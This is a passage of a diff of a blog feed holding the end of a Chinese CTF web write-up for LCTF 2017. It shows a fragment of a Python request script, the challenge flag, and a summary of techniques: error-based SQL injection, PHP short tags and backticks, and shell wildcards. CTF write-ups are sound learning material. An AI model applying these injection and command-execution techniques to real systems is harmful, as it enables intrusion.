requests.get(url1+path)</div><div class="line">	<span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/4.png?raw=true" alt=""></p>
-<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</div></pre></td></tr></table></figure></p>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
-<li>基于报错的sql注入：<ul>
-<li>获取库名，表名，列名，数据</li>
-<li>join using</li>
-</ul>
-</li>
-<li>php技巧:<ul>
-<li>短标签</li>
-<li>反引号</li>
-<li>echo缩写</li>
-</ul>
-</li>
-<li>shell通配符</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点&lt;/p&gt;
-&lt;p&gt;LCTF-2017-他们有什么秘密呢-writeup&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
